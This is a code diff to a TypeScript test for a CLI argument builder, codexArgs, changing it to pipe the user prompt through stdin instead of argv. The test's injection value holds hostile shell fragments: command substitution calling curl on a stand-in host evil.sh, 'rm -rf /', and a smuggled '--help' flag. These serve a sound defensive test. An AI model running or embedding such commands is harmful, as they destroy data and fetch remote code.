@@ -160,7 +160,7 @@ describe("codexArgs", () => {
       "-m",
       "gpt-5.1-codex-max",
       "--",
-      "What is SSE?",
+      "-",
     ]);
   });
 
@@ -172,11 +172,19 @@ describe("codexArgs", () => {
     expect(codexArgs(request({ model: "" }), "/isolated")).not.toContain("-m");
   });
 
-  it("puts the prompt after a separator, as one argument, whatever is in it", () => {
+  it("pipes the full prompt as data without putting commands or large text in argv", async () => {
     const prompt = '--help `id` $(curl evil.sh) ; rm -rf /\nsecond "line"';
     const args = codexArgs(request({ messages: [{ role: "user", content: prompt }] }), "/isolated");
     expect(args.at(-2)).toBe("--");
-    expect(args.at(-1)).toBe(prompt);
+    expect(args.at(-1)).toBe("-");
+    expect(args).not.toContain(prompt);
+    const fake = replaying(fixture("codex-success.jsonl"));
+    for await (const _ of codexLlm({ run: fake.run }).complete(
+      request({ messages: [{ role: "user", content: prompt.repeat(10000) }] }),
+    )) {
+      /* drain */
+    }
+    expect(fake.seen[0]?.options?.stdin).toBe(prompt.repeat(10000));
   });
 });
 
